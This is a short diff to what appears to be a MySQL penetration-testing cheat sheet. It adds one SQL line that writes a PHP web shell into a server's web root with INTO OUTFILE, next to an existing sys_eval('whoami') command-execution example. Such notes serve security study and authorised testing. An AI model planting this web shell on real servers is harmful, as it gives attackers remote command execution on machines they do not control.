@@ -101,6 +101,12 @@ If mysql is running as root you can run commands by typing:
 
 `select sys_eval('whoami');` 
 
+```text
+select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/this-is-my-shell.php'
+```
+
+
+
 ## Enumeration
 
 ### Nmap 
